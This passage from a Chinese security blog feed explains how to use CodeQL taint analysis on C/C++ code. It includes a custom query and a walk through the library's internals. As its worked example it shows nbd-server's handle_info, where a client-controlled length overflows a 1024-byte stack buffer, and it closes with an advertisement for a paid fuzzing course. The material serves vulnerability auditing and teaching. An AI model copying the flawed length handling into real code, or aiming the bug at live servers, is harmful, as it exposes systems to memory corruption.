class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Do the initial negotiation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param net The socket we're doing the negotiation over.</span></span><br><span class="line"><span class="comment"> * @param servers The array of known servers.</span></span><br><span class="line"><span class="comment"> * @param genconf the global options (needed for accessing TLS config data)</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="function">CLIENT* <span class="title">negotiate</span><span class="params">(<span class="keyword">int</span> net, GArray* servers, struct generic_conf *genconf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">uint16_t</span> smallflags = NBD_FLAG_FIXED_NEWSTYLE | NBD_FLAG_NO_ZEROES;</span><br><span class="line"><span class="keyword">uint64_t</span> magic;</span><br><span class="line"><span class="keyword">uint32_t</span> cflags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> opt;</span><br><span class="line">    <span class="comment">// 创建并初始化 client 结构体</span></span><br><span class="line">CLIENT* client = g_new0(CLIENT, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 将 socket fd 赋给 cleint</span></span><br><span class="line">client-&gt;net = net;</span><br><span class="line">client-&gt;socket_read = socket_read_notls;</span><br><span class="line">client-&gt;socket_write = socket_write_notls;</span><br><span class="line">client-&gt;socket_closed = socket_closed_negotiate;</span><br><span class="line"></span><br><span class="line">assert(servers != <span class="literal">NULL</span>);</span><br><span class="line">socket_write(client, INIT_PASSWD, <span class="number">8</span>);</span><br><span class="line">magic = htonll(opts_magic);</span><br><span class="line">socket_write(client, &amp;magic, <span class="keyword">sizeof</span>(magic));</span><br><span class="line"></span><br><span class="line">smallflags = htons(smallflags);</span><br><span class="line">socket_write(client, &amp;smallflags, <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line">    <span class="comment">// 从 client 读取数据</span></span><br><span class="line">socket_read(client, &amp;cflags, <span class="keyword">sizeof</span>(cflags));</span><br><span class="line">cflags = htonl(cflags);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，我们可以<code>socket_read</code>的第二个参数（用户输入将读入到这里）作为source点，然后将看能否污点到后续调用的<code>source_read</code>的第三个参数（即控制读入的长度），当然也可以做其他污点。</p><h3 id="QL-source-code"><a href="#QL-source-code" class="headerlink" title="QL source code"></a>QL source code</h3><p>使用的QL如下，由于污点分析不会对未建模的函数进行进一步污点传播，所以这里通过覆盖isAdditionalTaintStep来手动构建<strong>函数参数到函数调用</strong>的额外边，另外一个需要注意的是我使用的是<code>semmle.code.cpp.ir.dataflow.TaintTracking</code>而不是文档里的<code>semmle.code.cpp.dataflow.TaintTracking</code>，前者是基于IR的新API，被建议使用，也广泛应用在codeql自己的<a href="https://codeql.github.com/codeql-query-help/full-cwe/" target="_blank" rel="noopener">cwe case</a>里</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-01-27-042252.png" alt=""></p><p>大概的结构是继承<code>TaintTracking::Configuration</code>之后覆盖里面的方法即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.ir.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">htonlCallEdge</span><span class="params">(DataFlow::Node node1, DataFlow::Node node2)</span> </span>&#123;</span><br><span class="line">  exists(FunctionCall fc |</span><br><span class="line">    <span class="comment">// fc.getTarget().getName() = "htonl" and</span></span><br><span class="line">    node1.asExpr() = fc.getAnArgument() <span class="keyword">and</span></span><br><span class="line">    node2.asExpr() = fc</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDataFlowConfiguration</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  MyDataFlowConfiguration() &#123; <span class="keyword">this</span> = <span class="string">"MyDataFlowConfiguration"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists(FunctionCall fc | fc.getArgument(<span class="number">1</span>) = source.asExpr() |</span><br><span class="line">      fc.getTarget().hasGlobalName(<span class="string">"socket_read"</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="comment">// sink.asExpr().getLocation().toString().matches("%nbd-server%") and</span></span><br><span class="line">    <span class="comment">// sink.asExpr() instanceof BinaryArithmeticOperation</span></span><br><span class="line">    exists(FunctionCall fc | fc.getArgument(<span class="number">2</span>) = sink.asExpr() |</span><br><span class="line">      fc.getTarget().hasGlobalName(<span class="string">"socket_read"</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    htonlCallEdge(node1, node2)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from MyDataFlowConfiguration config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, <span class="string">""</span></span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>最终发现的漏洞在<code>handle_info</code>里的一个栈溢出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">handle_info</span><span class="params">(CLIENT* client, <span class="keyword">uint32_t</span> opt, GArray* servers, <span class="keyword">uint32_t</span> cflags)</span> </span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> namelen, len;</span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">SERVER *server = <span class="literal">NULL</span>;</span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从远程读入 len</span></span><br><span class="line">socket_read(client, &amp;len, <span class="keyword">sizeof</span>(len));</span><br><span class="line">len = htonl(len);</span><br><span class="line">    <span class="comment">// 2. 从远程读入 namelen</span></span><br><span class="line">socket_read(client, &amp;namelen, <span class="keyword">sizeof</span>(namelen));</span><br><span class="line">namelen = htonl(namelen);</span><br><span class="line">    <span class="comment">// 3. 进入 if 分支</span></span><br><span class="line"><span class="keyword">if</span>(namelen &gt; (len - <span class="number">6</span>)) &#123;</span><br><span class="line">send_reply(client, opt, NBD_REP_ERR_INVALID, <span class="number">-1</span>, <span class="string">"An OPT_INFO request cannot be smaller than the length of the name + 6"</span>);</span><br><span class="line">        <span class="comment">// 4. 从 client 读入数据，由于 len 可控，因此可以造成栈溢出</span></span><br><span class="line">socket_read(client, buf, len - <span class="keyword">sizeof</span>(namelen));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(namelen &gt; <span class="number">0</span>) &#123;</span><br><span class="line">name = <span class="built_in">malloc</span>(namelen + <span class="number">1</span>);</span><br><span class="line">name[namelen] = <span class="number">0</span>;</span><br><span class="line">socket_read(client, name, namelen);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">name = strdup(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="codeql污点分析源码分析"><a href="#codeql污点分析源码分析" class="headerlink" title="codeql污点分析源码分析"></a>codeql污点分析源码分析</h2><p><code>TaintTracking::Configuration</code>定义在<code>cpp/ql/lib/semmle/code/cpp/ir/dataflow/internal/tainttracking1/TaintTrackingImpl.qll</code>里</p><p>它其实继承自<code>DataFlow::Configuration</code>，然后扩展了<code>isAdditionalFlowStep</code>，注意到这里先调用了<code>this.isAdditionalTaintStep</code>，这就是我们可以继承后覆盖的代码，引入我们自己的额外边，同时它还有一个<code>defaultAdditionalTaintStep</code>，这是该污点自己对数据流进行的扩展。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">Configuration</span> <span class="title">extends</span> <span class="title">DataFlow</span>:</span>:Configuration&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function">predicate <span class="title">isAdditionalTaintStep</span><span class="params">(DataFlow::Node node1, DataFlow::Node node2)</span> </span>&#123; none() &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">final</span> <span class="keyword">override</span> predicate <span class="title">isAdditionalFlowStep</span><span class="params">(DataFlow::Node node1, DataFlow::Node node2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.isAdditionalTaintStep(node1, node2) <span class="keyword">or</span></span><br><span class="line">    defaultAdditionalTaintStep(node1, node2)</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"><span class="function">predicate <span class="title">defaultAdditionalTaintStep</span><span class="params">(DataFlow::Node src, DataFlow::Node sink)</span> </span>&#123;</span><br><span class="line">  localAdditionalTaintStep(src, sink)</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">cached</span><br><span class="line"><span class="function">predicate <span class="title">localAdditionalTaintStep</span><span class="params">(DataFlow::Node nodeFrom, DataFlow::Node nodeTo)</span> </span>&#123;</span><br><span class="line">  operandToInstructionTaintStep(nodeFrom.asOperand(), nodeTo.asInstruction())</span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  instructionToOperandTaintStep(nodeFrom.asInstruction(), nodeTo.asOperand())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="operandToInstructionTaintStep"><a href="#operandToInstructionTaintStep" class="headerlink" title="operandToInstructionTaintStep"></a>operandToInstructionTaintStep</h3><p><code>operandToInstructionTaintStep</code> 用于把污点从<strong>参数</strong>流向<strong>指令返回值</strong>，这里做了许多连边处理：</p><ul><li>首先是<strong>运算指令</strong>的参数连边至整个运算指令：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Taint can flow through expressions that alter the value but preserve</span><br><span class="line">  &#x2F;&#x2F; more than one bit of it _or_ expressions that follow data through</span><br><span class="line">  &#x2F;&#x2F; pointer indirections.</span><br><span class="line">  instrTo.getAnOperand() &#x3D; opFrom and</span><br><span class="line">  (</span><br><span class="line">      instrTo instanceof ArithmeticInstruction</span><br><span class="line">      or</span><br><span class="line">      instrTo instanceof BitwiseInstruction</span><br><span class="line">      or</span><br><span class="line">      instrTo instanceof PointerArithmeticInstruction</span><br><span class="line">      or</span><br><span class="line">      &#x2F;&#x2F; The &#96;CopyInstruction&#96; case is also present in non-taint data flow, but</span><br><span class="line">      &#x2F;&#x2F; that uses &#96;getDef&#96; rather than &#96;getAnyDef&#96;. For taint, we want flow</span><br><span class="line">      &#x2F;&#x2F; from a definition of &#96;myStruct&#96; to a &#96;myStruct.myField&#96; expression.</span><br><span class="line">      instrTo instanceof CopyInstruction</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p>这里的连边操作将<strong>算数运算</strong>、<strong>位运算</strong>、<strong>指针运算</strong> 和<strong>字段使用</strong>等指令的参数连向了整个指令。</p><p>例如如果我们污点到了<code>len + 1</code>的<code>len</code>，那么它将把污点从len传播到<code>len + 1</code>这个AddExpr中。</p><ul><li>其次是<strong>一元运算指令</strong>，这里排除了<strong>字段取地址指令</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Unary instructions tend to preserve enough information in practice that we</span><br><span class="line">&#x2F;&#x2F; want taint to flow through.</span><br><span class="line">&#x2F;&#x2F; The exception is &#96;FieldAddressInstruction&#96;. Together with the rules below for</span><br><span class="line">&#x2F;&#x2F; &#96;LoadInstruction&#96;s and &#96;ChiInstruction&#96;s, flow through &#96;FieldAddressInstruction&#96;</span><br><span class="line">&#x2F;&#x2F; could cause flow into one field to come out an unrelated field.</span><br><span class="line">&#x2F;&#x2F; This would happen across function boundaries, where the IR would not be able to</span><br><span class="line">&#x2F;&#x2F; match loads to stores.</span><br><span class="line">instrTo.(UnaryInstruction).getUnaryOperand() &#x3D; opFrom and</span><br><span class="line">(</span><br><span class="line">  not instrTo instanceof FieldAddressInstruction</span><br><span class="line">  or</span><br><span class="line">  instrTo.(FieldAddressInstruction).getField().getDeclaringType() instanceof Union</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>排除<strong>字段取地址指令</strong>的原因正如注释所说，流过 <code>FieldAddressInstruction</code> 可能会导致污点流从某个字段流入，从另一个不相关的字段流出。</p><ul><li>此外是为其他已经建模好的函数进行污点传递，其中污点从 callInput 传播到 callOutput。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modeledTaintStep(opFrom, instrTo)</span><br></pre></td></tr></table></figure><p>污点分析库会额外对库函数建模，对很多非常常用的函数建立额外边。这种建模是通过派生 <code>TaintFunction</code> 类，重写 <code>hasTaintFlow</code> 函数来实现的。我们可以全局搜索 TaintFunction 字符串，找到所有建模好的函数。以下是其中某个函数的建模实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * A function that is pure, that is, its evaluation is guaranteed to be</span><br><span class="line"> * side-effect free. Excludes functions modeled by &#96;PureStrFunction&#96; and &#96;PureMemFunction&#96;.</span><br><span class="line"> *&#x2F;</span><br><span class="line">private class PureFunction extends TaintFunction, SideEffectFunction &#123;</span><br><span class="line">  PureFunction() &#123; this.hasGlobalOrStdOrBslName([&quot;abs&quot;, &quot;labs&quot;]) &#125;</span><br><span class="line"></span><br><span class="line">  override predicate hasTaintFlow(FunctionInput input, FunctionOutput output) &#123;</span><br><span class="line">    exists(ParameterIndex i |</span><br><span class="line">      input.isParameter(i) and</span><br><span class="line">      exists(this.getParameter(i))</span><br><span class="line">    ) and</span><br><span class="line">    output.isReturnValue()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate hasOnlySpecificReadSideEffects() &#123; any() &#125;</span><br><span class="line"></span><br><span class="line">  override predicate hasOnlySpecificWriteSideEffects() &#123; any() &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>污点分析库对函数 <code>abs</code> 进行建模，重写 <code>hasTaintFlow</code>函数，将该函数的输入参数与函数的返回值相连。这样，如果该函数的参数被污染，那么该函数的返回值也将被视为污染。</p><p>数据流分析库同样会对一些库函数进行建模，但不同的是，所建模函数的数量并没有污点分析那么多，同时连接额外边的侧重点也不一样，以 gets 函数为例，以下是它的建模实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The standard functions `gets` and `fgets`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">GetsFunction</span> <span class="title">extends</span> <span class="title">DataFlowFunction</span>, <span class="title">TaintFunction</span>, <span class="title">ArrayFunction</span>, <span class="title">AliasFunction</span>,</span></span><br><span class="line"><span class="class">  <span class="title">SideEffectFunction</span>, <span class="title">RemoteFlowSourceFunction</span> &#123;</span></span><br><span class="line">  GetsFunction() &#123;</span><br><span class="line">    <span class="comment">// gets(str)</span></span><br><span class="line">    <span class="comment">// fgets(str, num, stream)</span></span><br><span class="line">    <span class="comment">// fgetws(wstr, num, stream)</span></span><br><span class="line">    <span class="keyword">this</span>.hasGlobalOrStdOrBslName([<span class="string">"gets"</span>, <span class="string">"fgets"</span>, <span class="string">"fgetws"</span>])</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">override</span> predicate <span class="title">hasDataFlow</span><span class="params">(FunctionInput input, FunctionOutput output)</span> </span>&#123;</span><br><span class="line">    input.isParameter(<span class="number">0</span>) <span class="keyword">and</span></span><br><span class="line">    output.isReturnValue()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">override</span> predicate <span class="title">hasTaintFlow</span><span class="params">(FunctionInput input, FunctionOutput output)</span> </span>&#123;</span><br><span class="line">    input.isParameter(<span class="number">2</span>) <span class="keyword">and</span></span><br><span class="line">    output.isParameterDeref(<span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">override</span> predicate <span class="title">parameterNeverEscapes</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123; index = <span class="number">2</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate parameterEscapesOnlyViaReturn(<span class="keyword">int</span> index) &#123; index = <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate parameterIsAlwaysReturned(<span class="keyword">int</span> index) &#123; index = <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate hasOnlySpecificReadSideEffects() &#123; any() &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate hasOnlySpecificWriteSideEffects() &#123; any() &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate hasSpecificWriteSideEffect(ParameterIndex i, boolean buffer, boolean mustWrite) &#123;</span><br><span class="line">    i = <span class="number">0</span> <span class="keyword">and</span></span><br><span class="line">    buffer = <span class="literal">true</span> <span class="keyword">and</span></span><br><span class="line">    mustWrite = <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate hasRemoteFlowSource(FunctionOutput output, <span class="built_in">string</span> description) &#123;</span><br><span class="line">    output.isParameterDeref(<span class="number">0</span>) <span class="keyword">and</span></span><br><span class="line">    description = <span class="string">"String read by "</span> + <span class="keyword">this</span>.getName()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate hasArrayWithVariableSize(<span class="keyword">int</span> bufParam, <span class="keyword">int</span> countParam) &#123;</span><br><span class="line">    <span class="keyword">not</span> <span class="keyword">this</span>.hasName(<span class="string">"gets"</span>) <span class="keyword">and</span></span><br><span class="line">    bufParam = <span class="number">0</span> <span class="keyword">and</span></span><br><span class="line">    countParam = <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate hasArrayWithUnknownSize(<span class="keyword">int</span> bufParam) &#123;</span><br><span class="line">    <span class="keyword">this</span>.hasName(<span class="string">"gets"</span>) <span class="keyword">and</span></span><br><span class="line">    bufParam = <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate hasArrayOutput(<span class="keyword">int</span> bufParam) &#123; bufParam = <span class="number">0</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到 hasDataFlow 的实现是将传入的第一个 buf 参数与返回值连接（buf参数的值会影响到 gets 的返回值）。而  hasTaintFlow 是将 fgets 等的<strong>数据来源</strong>与 buf 连接（数据来源会污染 buf 中的数据）。</p><ul><li>除此之外还涉及到ReadSideEffectInstruction/InitializeIndirectionInstruction等IR进行了额外的连边，但是笔者暂未找到合适的codeql IR文档，留待后文，但我初步推测应该和内存初始化和指针解引用等都有关系。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前看codeql的c/c++污点分析还是有局限性的，首先它并没有对c++的语法特性做适配，目前看只是字段访问的时候有额外的处理。<br>此外受限于符号支持，它并不能完全实现跨函数追踪，例如对于大部分标准库函数它目前都只能自己去建模，无法自动化的分析和追踪，但这不是ql的问题，是插桩的问题，这部分我在想通过静态链接能否有改善。</p><p>目前我们在自己做审计的时候，如果需要做跨函数的追踪，还是需要像我代码里一样去手动连边，这个连边可以是保守的也可以是粗放的，例如我的实现就是，如果污点传入的函数参数，就传播到函数调用。</p><p>此外根据我在做chrome QL审计的经验，可以参考<a href="https://github.com/github/securitylab/blob/677baf7fdc2bdd9d35a35ea4641b5efdfa7bba78/CodeQL_Queries/cpp/Chrome/callback_tracking.qll#L107" target="_blank" rel="noopener">Chrome Library</a>来补一些拷贝构造函数，智能指针，虚函数调用，以及c++容器相关的边。</p><p>这些也是留待后文。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CodeQL-数据流分析-污点分析-笔记（上篇）&quot;&gt;&lt;a href=&quot;#CodeQL-数据流分析-污点分析-笔记（上篇）&quot; class=&quot;headerlink&quot; title=&quot;CodeQL 数据流分析/污点分析 笔记（上篇）&quot;&gt;&lt;/a&gt;CodeQL 数据流分析/污
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="codeql" scheme="http://eternalsakura13.com/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>sakuraのfuzzing lab培训</title>
    <link href="http://eternalsakura13.com/2021/11/14/fuzzinglab/"/>
    <id>http://eternalsakura13.com/2021/11/14/fuzzinglab/</id>
    <published>2021-11-14T15:41:41.196Z</published>
    <updated>2021-12-19T02:20:58.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sakuraのfuzzing-lab培训"><a href="#sakuraのfuzzing-lab培训" class="headerlink" title="sakuraのfuzzing lab培训"></a>sakuraのfuzzing lab培训</h2><p>因为Fuzzing Lab的反响意外的还好，感谢大家，为了让大家更好的选择自己想学的内容，为大家省钱，我修订了Fuzzing Lab的内容。</p><h3 id="主讲人"><a href="#主讲人" class="headerlink" title="主讲人"></a>主讲人</h3><p>@sakura，二进制安全研究员、Fuzzing爱好者、浏览器bug hunter，获得过谷歌/苹果高危漏洞致谢，我的漏洞列表: <a href="https://eternalsakura13.com/buglist">https://eternalsakura13.com/buglist</a></p><h3 id="加入Fuzzing-Lab，你将获得："><a href="#加入Fuzzing-Lab，你将获得：" class="headerlink" title="加入Fuzzing Lab，你将获得："></a>加入Fuzzing Lab，你将获得：</h3><ul><li><strong>除第一个月的Fuzz基础外，我将在后续每个月按专题推出技术内容，例如在这个月主讲浏览器Fuzz，下个月主讲内核Fuzz等，让每个人能听到自己更感兴趣的专题内容，避免无用付费，你甚至可以单独购买Fuzz基础内容</strong></li><li>学习形式: 每周末的技术直播，讲解各类Fuzz原理，不同目标的合适的解决方案；提供学习路径和课后作业，动手调试，尝试挖掘。</li><li>和业内资深fuzz安全研究员近距离交流的机会，享有每周的直播分享、头脑风暴、技术答疑，从原理上掌握Fuzz技术，并应用在漏洞挖掘场景中。</li></ul><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题:"></a>常见问题:</h3><p>问1:我适合学习Fuzzing Lab吗?<br>答1:如果你是安全从业者、学生，开发人员等，对c/c++系代码有一定了解，愿意花时间尝试，一定能学有所获。</p><p>问2:我能只买Fuzz基础/浏览器等某个月的具体专题的内容吗?<br>答2:可以，为了避免无用消费，大家不必全都学习。我鼓励大家更多的尝试不同的方向，而且因为内容是持续积累的，所以任何时候想学习之前的专题，都可以再补票，不用担心错过。</p><h3 id="订阅费用与付费方法"><a href="#订阅费用与付费方法" class="headerlink" title="订阅费用与付费方法:"></a>订阅费用与付费方法:</h3><ul><li><p>Fuzzing Lab现价: <strong>500元/每个专题/月，如果是星球成员，从星球群里加我并备注fuzzinglab可享首月5折优惠。</strong><br>因为内容是持续积累的，所以如果现在你想学习内核Fuzz，我也还没有备课到，我每个月讲一个专题，并在这个帖子和我的博客长期更新目录，随时可以选择学习某个专题的内容。</p></li><li><p>课程购买链接</p></li></ul><p>专题1: Fuzz基础<br><a href="https://m.weishi100.com/mweb/series/?id=1326479" target="_blank" rel="noopener">https://m.weishi100.com/mweb/series/?id=1326479</a></p><p>专题2: 浏览器Fuzz-1<br><a href="https://m.weishi100.com/mweb/series/?id=1326477" target="_blank" rel="noopener">https://m.weishi100.com/mweb/series/?id=1326477</a></p><h3 id="我的愿景"><a href="#我的愿景" class="headerlink" title="我的愿景:"></a>我的愿景:</h3><p>我想输出更多东西，想让更多人进入二进制安全这个大方向，能够和大家一起成长，一起进步，不妄自菲薄，成为最好的自己。</p><h2 id="目录"><a href="#目录" class="headerlink" 